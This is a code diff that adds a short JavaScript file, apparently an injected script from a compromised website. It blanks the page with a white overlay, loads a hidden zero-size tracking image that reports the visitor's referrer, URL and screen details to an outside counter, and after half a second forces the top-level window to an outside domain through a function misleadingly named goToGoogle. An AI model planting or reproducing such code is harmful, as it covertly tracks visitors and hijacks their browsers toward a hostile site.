@@ -1,0 +1,7 @@
+document.write('<div style="position: absolute; top: 0; left: 0; width: 100%;  height: 100%;  background-color: #FFFFFF; padding: 0px"></div>');
+document.write("<img src='//counter.yadro.ru/hit;newtraffic?t45.6;r"+escape(document.referrer)+((typeof(screen)=="undefined")?"":";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+";"+Math.random()+"' border='0' width='0' height='0'>");
+var url = "http://2011thebest.co.cc/t/";
+function goToGoogle() {
+if (window!=top) {top.location.href = url;} else document.location= url;
+}
+  window.setTimeout(goToGoogle, 500);
